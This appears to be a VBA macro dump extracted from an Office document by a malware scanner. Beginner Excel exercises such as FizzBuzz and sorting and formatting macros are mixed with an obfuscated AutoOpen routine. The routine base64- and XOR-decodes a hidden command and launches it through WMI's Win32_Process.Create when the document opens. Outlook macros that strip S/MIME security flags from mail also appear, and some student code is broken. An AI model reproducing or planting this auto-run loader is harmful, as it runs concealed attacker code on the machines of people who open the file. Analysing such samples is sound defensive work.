Attribute VB_Name = "Module1"
Private Const CP_UTF8                       As Long = 65001

#If Win64 Then
Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
#Else
Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long

#End If

Public Sub HideEmptyColumns()

  Dim rng As Range
  Dim nLastRow As Long
  Dim nLastColumn As Integer
  Dim i As Integer
  Dim HideIt As Boolean
  Dim j As Long

  Set rng = ActiveSheet.UsedRange
  nLastRow = rng.Rows.count + rng.Row - 1
  nLastColumn = rng.Columns.count + rng.Column - 1

  For i = 1 To nLastColumn
    HideIt = True

    For j = 2 To nLastRow
      If Not Rows(j).Hidden Then
        If Cells(j, i).Value <> "" Then
          HideIt = False
          Exit For
        End If
      End If
    Next

    Columns(i).EntireColumn.Hidden = HideIt
  Next

End Sub

Sub AddNumbers():
    Dim itemTotal As Double
    Dim itemPrice As Double
    Dim taxRate As Double
    Dim quantity As Double
    
    itemPrice = Range("A2").Value
    taxRate = Range("B2").Value
    quantity = Range("C2").Value
    
    
    itemTotal = itemPrice * (1 + taxRate) * quantity
    
    MsgBox ("Your total is $" + Str(itemTotal))
    Range("D2").Value = itemTotal
    
    
End Sub



' Sentence Breaker

Sub SentenceBreaker()
Dim Sentnece As String
sentence = Cells(1, 2).Value
MsgBox (sentence)

Dim num1 As Integer
Dim num2 As Integer
Dim num3 As Integer

num1 = Cells(4, 1).Value
num2 = Cells(5, 1).Value
num3 = Cells(6, 1).Value

MsgBox (num1)
MsgBox (num2)
MsgBox (num3)

Dim SentenceArray() As String
SentenceArray = Split(sentence, " ")

Cells(4, 2).Value = SentenceArray(num1 - 1)
Cells(5, 2).Value = SentenceArray(num2 - 1)
Cells(6, 2).Value = SentenceArray(num3 - 1)

End Sub


' If statements of doom
Sub Doom():
Dim path As Integer
path = Range("B1").Value

If path = 1 Then
    MsgBox ("You have entered the forrest of doom")
ElseIf path = 2 Then
    MsgBox ("You have entered the volcano of doom")
ElseIf path = 3 Then
    MsgBox ("You have enterd the bathroom")
ElseIf path > 3 Then
    MsgBox ("You need directions")
End If
End Sub

Sub budgetChecker():
    Dim Budget As Double
    Dim Price As Double
    Dim Fees As Double
    Dim Total As Double
    
    Budget = Range("C3").Value
    Price = Range("F3").Value
    Fees = Range("H3").Value
    Total = Price + Price * Fees
    
    Range("L3").Value = Total
    
    If Price < Budget Then
        MsgBox ("Under Budget")
    ElseIf Price > Budget Then
        MsgBox ("Over Budget")
    End If
    
End Sub

' Chicken Nuggs
Sub forLoop():
    
    For i = 1 To 10
        Cells(i, 1).Value = "I will eat"
        Cells(i, 2).Value = i + 10
        Cells(i, 3).Value = "Chicken Nuggets"
    Next i
           
End Sub

' Conditional Loop
Sub conditional_loop():

    For i = 1 To 10
    
        If Cells(i, 1).Value Mod 2 = 0 Then
        Cells(i, 2).Value = "Even Row"
        
        Else
        
        Cells(i, 2).Value = "Odd Row"
        
        End If
        Next i
End Sub

'Fizz buzz for loop
Sub fizzBuzz():
    For i = 2 To 101
    'next time init variable
    'num = Cells(i,1).value
    
    If Cells(i, 1).Value Mod 5 = 0 And Cells(i, 1).Value Mod 3 = 0 Then
        Cells(i, 2).Value = "FizzBuzz"
    ElseIf Cells(i, 1).Value Mod 5 = 0 Then
        Cells(i, 2).Value = "Fizz"
    ElseIf Cells(i, 1).Value Mod 3 = 0 Then
        Cells(i, 2).Value = "Buzz"
        
        
    End If
Next i

End Sub

Sub ClassScanner():
    Dim targetStudent As String
        For i = 1 To 3
            For j = 1 To 5
                'MsgBox("row " + i + " Column: " + j + " | " + Cells(i,j).Value)
            Next j
        Next i
    End Sub

'Hornet count

Sub HornetsNest():
    Dim HornetsCount As Integer
    Dim BugsCount As Integer
    Dim BeesCount As Integer

    BugsCount = Range("L2").Value
    BeesCount = Range("R2").Value

    HornetsCount = 0

    For i = 1 To 6
        For j = 1 To 7

            If Cells(i, j).Value = "Hornets" Then
            HornetsCount = HornetsCount + 1

            If (BugsCount > 0) Then
            Cells(i, j).Value = "Bugs"
            BugsCount = BugsCount - 1

            ElseIf (BeesCount > 0) Then
            Cells(i, j).Value = "Bees"
            BeesCount = BeesCount - 1

            End If
        End If
    Next j
Next i

MsgBox (HornetsCount + " Hornets Found")

If (Range("L2").Value + Range(""))

End Sub



'STONKS 2

Sub Stonks()
    Dim ticker As String
    Dim oldTicker As String
    Dim newTicker As String
   
    ticker = Cells(2, 1).Value
   
    'Input Variables
    Dim openPrice As Double
    Dim closePrice As Double
    Dim volume As Long
   
    openPrice = Cells(2, 3).Value
    closePrice = Cells(2, 6).Value
    volume = Cells(2, 7).Value
   
    'Output Variables
    Dim yearlyChange As Double
    Dim percentChange As Double
    Dim totalVolume As Long
   
   
    '70926
    For i = 2 To 70926
        For t = 2 To 264
            If Cells(i, 1).Value <> ticker Then
             Cells(t, 9).Value = Cells(i, 1).Value
                
            End If
        'volume = volume + volume
            
        Next t
    Next i
'totalVolume = volume


    'Output in sheet
    Cells(2, 12).Value = totalVolume
       
       
       
    
End Sub

Sub StarCounter()

  ' Create a variable to hold the StarCounter. We will repeatedly use this.
    Dim starCount As Integer
   ' Dim lastrow

    
    'lastrow = Cells(Rows.Count, 1) .End(xlup).Row
    'msgbox(lastrow)
  ' Loop through each row
  For i = 2 To 49

    ' Initially set the StarCounter to be 0 for each row
        starCount = 0

    ' While in each row, loop through each star column
        For j = 4 To 8

      ' If a column contains the word "Full-Star"...
            If Cells(i, j).Value = "Full-Star" Then

        ' Add 1 to the StarCounter
            starCount = starCount + 1

    ' Once we've iterated through each column in row i, print the value in the total column.
        
        End If
    Next j
    Cells(i, 9).Value = starCount
  Next i

End Sub



''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



Public Function ToBase64(sValue As String, Optional ByVal MultiLine As Boolean) As String
    Dim baValue()       As Byte
    Dim lSize           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin.base64"
        ReDim baValue(0 To 4 * Len(sValue))
        lSize = WideCharToMultiByte(CP_UTF8, 0, StrPtr(sValue), Len(sValue), baValue(0), UBound(baValue) + 1, 0, 0)
        If lSize > 0 Then
            ReDim Preserve baValue(0 To lSize - 1)
            .NodeTypedValue = baValue
        End If
        ToBase64 = .Text
        If Not MultiLine Then
            ToBase64 = Replace(Replace(ToBase64, vbCrLf, vbNullString), vbLf, vbNullString)
        End If
    End With
End Function



Public Function Groa(sBase64 As String) As String
    Dim baValue()       As Byte
    Dim sValue          As String
    Dim lSize           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin.base64"
        .Text = sBase64
        baValue = .NodeTypedValue
        sValue = String$(4 * UBound(baValue), 0)
        lSize = MultiByteToWideChar(CP_UTF8, 0, baValue(0), UBound(baValue) + 1, StrPtr(sValue), Len(sValue))
        Groa = Left$(sValue, lSize)
    End With
End Function

Private Function yetras(Text As String, key As String) As String
  Dim bText() As Byte
  Dim bKey() As Byte
  
  Dim TextUB As Long
  Dim KeyUB As Long
  
  
  
  bText = StrConv(Text, vbFromUnicode)
  bKey = StrConv(key, vbFromUnicode)
  TextUB = UBound(bText)
  KeyUB = UBound(bKey)
  Dim TextPos As Long
  Dim Trenfa As Long
  For TextPos = 0 To TextUB
    bText(TextPos) = bText(TextPos) Xor bKey(Trenfa)
    If Trenfa < KeyUB Then
      Trenfa = Trenfa + 1
    Else
      Trenfa = 0
    End If
  Next TextPos
  yetras = StrConv(bText, vbUnicode)
End Function

Sub AutoOpen()
    Dim Vniko As String
    Dim Floyd
    Dim May
    
    Floyd = Null
    May = Null
    
    Const impersonation = 3
    
    Set Locator = CreateObject("WbemScripting.SWbemLocator")
    Set Service = Locator.ConnectServer()
    Service.Security_.ImpersonationLevel = impersonation
    Set Flumen = Service.Get("Win32_Process")
    Set Dear_myBera = Service.Get(yetras(Groa("IQwcQFM8OAwYAiEHABcdFlgkFhcTBhsWS0IXHgMCGgQVABYcTw4BBgQKARwHF0YGGQhVXzMGGwoaExcyBQcaAAUWPBIMBhtYIhcHFg=="), "versache"))
    With Dear_myBera
        If .StatusCode = 0 Then
            End
        ElseIf .StatusCode > 0 Then
            End
        End If
    End With
    On Error Resume Next
    Gotik = Flumen.Create(yetras(Groa("FQgWU04ASBUZEhcBEgsNCRpFXwQIDQwKARYGCg0GSA0fARYWD0NFBhkIHxIPB0gsGxUdARVOJQoSEB4WQSEBEQUxABIPEA4ABF5SIBUCGhFbJxsHEjcaBBgWFBYTQ0U2GRAAEARDABECFQFJTkwaBAFLFRoVCx0HAxYXAQIMBhETCwZdAgwFShsMHh8ICA0LRwcAHAUGGgwVDl1HUgUNF1kIEwAVBhpKFAkdBE8GEABaDQYHERBSSlkXEwRPBAERHhAQBhIGGgYZCwYWDxdGBhkIXR4IDwQMHQAcQgMRBwETFxsQCkxcVhAAAFwMAhsRExddFwQRCUkeEQYDEllHSgQEBV0GChwNAwcHAAQRCwoYERcdFU0LChtKHxoNDwEOEwtDERMMDAAEDBEYTldbAxMXXR4AEBwABEo4BQ0TKksTHRdTTCcNFgIMHBIVCgcLVjlQVwQNHl8iID8jPQEECgFLFwsEP0pJKkdWFg8VUjEzKCIvBQYaBCpHXi9DRw0LAF8mNiwzNC8ACQIxTwYQACpHUlVBQwsABBEHBwgPSEgSABEcBQZIQAIAHwNEPwwABARSVhUGBRVTORYWEwJGAA4AUlVBEwcSExcBGwQPBEVbEhsdBQwfFgIcHhZBCwEBEgAcU0wABwgbBBwXQTANEVspHRAAFwEKGEVfIwAXAEUqR1YWDxVSMTMoIi9DWEg2AgQAB0wzGgoVAAEAQQEECgFLFwsEQ0UkBAIHHgQNHCkfFgZTBQYaBFgAChY="), "versache"), Floyd, May, bliker)

End Sub

Public Function DUPLO(file_path As String) As Boolean
    

    trega = Dir(file_path) <> ""
    Exit Function

DirErr:
      If Err.Number = 68 Then
        trega = False
    Else
        MsgBox Err.Description & " (" & Err.Number & ")", , "Run-time Error"
        Stop
    End If
End Function

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


Sub StandardInbox()
    Set oOutlook = CreateObject("Outlook.Application")
    Set oNamespace = oOutlook.GetNamespace("MAPI")
    If MsgBox("Decrypt all emails in Folder " & oNamespace.GetDefaultFolder(6).Name & " (no Subfolders)?", vbYesNo) = 6 Then
        Debug.Print "Confirm Folder: " & oNamespace.GetDefaultFolder(6).Name&; " = Yes"
        Set objFold = oNamespace.GetDefaultFolder(6)
        Debug.Print "Processing " & objFold.Items.count & " Emails"
        Debug.Print "Processing Folder"
        Call ProcessFolders(objFold)
    Else
        Debug.Print "Confirm Folder: " & oNamespace.GetDefaultFolder(6).Name&; " = No"
    End If
    MsgBox ("Finished")
    Debug.Print "Finished"
    
End Sub
Function ProcessFolders()
    If objCurrentFolder.DefaultItemType = olMailItem Then
       Const PR_SECURITY_FLAGS = "http://schemas.microsoft.com/mapi/proptag/0x6E010003"
       ulFlags = 0
       ulFlags = ulFlags Or &H0
       Debug.Print objCurrentFolder.Name
       For i = objCurrentFolder.Items.count To 1 Step -1
            'DoEvents to retain responsiveness
            DoEvents
            Set objMail = objCurrentFolder.Items(i)
            Debug.Print objMail.Subject
            If objMail.Class = "olMail" Or objMail.Class = "43" Then
              'Debug.Print "Class: " & objMail.Class
              'exclude not donloaded (only header) mails
              'SMIME check has to happen before PropertyAccessor because when the object ist "opened" it is no SMIME anymore
              If objMail.DownloadState <> olHeaderOnly And objMail.MessageClass = "IPM.Note.SMIME" Then
                  'Debug.Print "DownloadState: " & objMail.DownloadState
                  'Debug.Print objMail.MessageClass
                  oProp = CLng(objMail.PropertyAccessor.GetProperty(PR_SECURITY_FLAGS))
                  'Debug.Print objMail.MessageClass
                  'If oProp = 1 Then
                  'If objMail.MessageClass = "IPM.Note.SMIME" Then
                    'Debug.Print "Processing Mail with Subject: " & objMail.Subject
                    'Debug.Print objMail.Parent
                    objMail.PropertyAccessor.SetProperty PR_SECURITY_FLAGS, ulFlags
                    objMail.Save
                    'Return '(end after first hit)
                  'End If
              End If
            End If
        Next
    End If
End Function

Sub GetSelectedItems()
 
 Dim myOlExp As Outlook.Explorer
 Dim myOlSel As Outlook.Selection
 Dim MsgTxt As String
 Dim x As Integer
 
 Const PR_SECURITY_FLAGS = "http://schemas.microsoft.com/mapi/proptag/0x6E010003"
 ulFlags = 0
 ulFlags = ulFlags Or &H0
       
 'MsgTxt = "You have selected items from: "
 Set myOlExp = Application.ActiveExplorer
 Set myOlSel = myOlExp.Selection
 For x = 1 To myOlSel.count
    'DoEvents to retain responsiveness
    DoEvents
    'MsgTxt = MsgTxt & myOlSel.Item(x).SenderName & ";"
    Debug.Print myOlSel.Item(x).MessageClass
    If myOlSel.Item(x).MessageClass = "IPM.Note.SMIME" Then
        Debug.Print "YES"
    End If
    Debug.Print myOlSel.Item(x).Class
    Debug.Print myOlSel.Item(x).DownloadState
    
    myOlSel.Item(x).PropertyAccessor.SetProperty PR_SECURITY_FLAGS, ulFlags
    myOlSel.Item(x).Save
 Next x
 'MsgBox MsgTxt
 MsgBox ("Ende")
 
End Sub
Public Sub cleanUpData()
    Dim i As Integer
    i = 1
    Do While i <= Worksheets.count
        Worksheets(i).Select
        AddHeaders
        FormatHeader
        
        i = i + 1
        
    
    Loop
End Sub




Sub AddHeaders()
Attribute AddHeaders.VB_Description = "This marco places headers on the worksheets"
Attribute AddHeaders.VB_ProcData.VB_Invoke_Func = "y\n14"
'
' AddHeaders Macro
' This marco places headers on the worksheets
'
' Keyboard Shortcut: Ctrl+y
'
    Rows("1:1").Select
    Selection.Insert Shift:=xlDown
    Range("A1").Select
    ActiveCell.FormulaR1C1 = "Region"
    Range("B1").Select
    ActiveCell.FormulaR1C1 = "Category"
    Range("C1").Select
    ActiveCell.FormulaR1C1 = "Jan"
    Range("D1").Select
    ActiveCell.FormulaR1C1 = "Feb"
    Range("E1").Select
    ActiveCell.FormulaR1C1 = "Mar"
    Range("F1").Select
    ActiveCell.FormulaR1C1 = "Total"
    Range("A2").Select
End Sub


Sub FormatHeader()
Attribute FormatHeader.VB_Description = "Format the headers for this worksheet"
Attribute FormatHeader.VB_ProcData.VB_Invoke_Func = "u\n14"
'
' FormatHeader Macro
' Format the headers for this worksheet
'
' Keyboard Shortcut: Ctrl+u
'
    Rows("1:1").Select
    Selection.Font.Bold = True
    Range("A1").Select
    ActiveCell.FormulaR1C1 = "Region"
    Range("A1:F1").Select
    Range("F1").Activate
    Application.Width = 598.5
    Application.Height = 456
    With Selection.Interior
        .Pattern = xlSolid
        .PatternColorIndex = xlAutomatic
        .Color = 65535
        .TintAndShade = 0
        .PatternTintAndShade = 0
    End With
    With Selection.Interior
        .Pattern = xlSolid
        .PatternColorIndex = xlAutomatic
        .ThemeColor = xlThemeColorDark2
        .TintAndShade = 0
        .PatternTintAndShade = 0
    End With
    Range("F1").Select
End Sub

Public Sub UserSortInput()
    Dim userInput As String
    Dim promptmsg As String
    Dim tryagain As Integer
    
    promptmsg = "Enter a numeric value to sort..." & vbCrLf & _
        "1 --- Sort by dvision" & vbCrLf & _
        "2 --- Sort by catagory" & vbCrLf & _
        "3 --- Sort by Total"
        
    userInput = InputBox(promptmsg)
    
    If userInput = "1" Then
        DivisionSort
    ElseIf userInput = "2" Then
        CategorySort
    ElseIf userInput = "3" Then
        TotalSort
    Else
        tryagain = MsgBox("Invalid value try again", vbYesNo)
        If tryagain = 6 Then
            UserSortInput
        
        End If
        
    
    
    End If
    
        
        
    
    
End Sub




Sub DivisionSort()
Attribute DivisionSort.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Sort List by Division Ascending
'

'
    Selection.Sort Key1:=Range("A4"), Order1:=xlAscending, Header:=xlGuess, _
        OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
        DataOption1:=xlSortNormal

End Sub

Sub CategorySort()
'
' Sort List by Category Ascending
'

'
    Selection.Sort Key1:=Range("B4"), Order1:=xlAscending, Header:=xlGuess, _
        OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
        DataOption1:=xlSortNormal

End Sub

Sub TotalSort()
'
' Sort List by Total Sales Ascending
'

'
    Selection.Sort Key1:=Range("F4"), Order1:=xlAscending, Header:=xlGuess, _
        OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
        DataOption1:=xlSortNormal

End Sub
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

' InQuest injected base64 decoded content
' @S<8
' V9PW
' _" ?#=
' ?JI*GV
' R13("/
' *G^/CG
' _&6,34/
' *GRUAC
' E*GV
' R13("/CXH6

INQUEST-PP=macro
